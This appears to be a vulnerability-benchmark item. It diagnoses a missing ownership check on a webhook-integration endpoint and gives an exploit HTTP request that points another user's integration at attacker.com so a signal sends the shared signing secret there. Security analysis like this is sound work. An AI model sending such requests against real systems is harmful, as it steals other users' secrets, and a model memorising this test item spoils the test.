diagnosis: The view retrieves and updates ExternalWebhookIntegration using integration_id from the URL without verifying ownership. Upon saving, a post_save signal fires an HTTP POST containing the integration's shared_secret to target_url, allowing an attacker to exfiltrate signing secrets to their own server.
exploit_request:
POST /api/integrations/4412/endpoint/ HTTP/1.1
Host: api.example.com
Cookie: sessionid=attacker_session
Content-Type: application/x-www-form-urlencoded

target_url=https%3A%2F%2Fattacker.com%2Fcatch
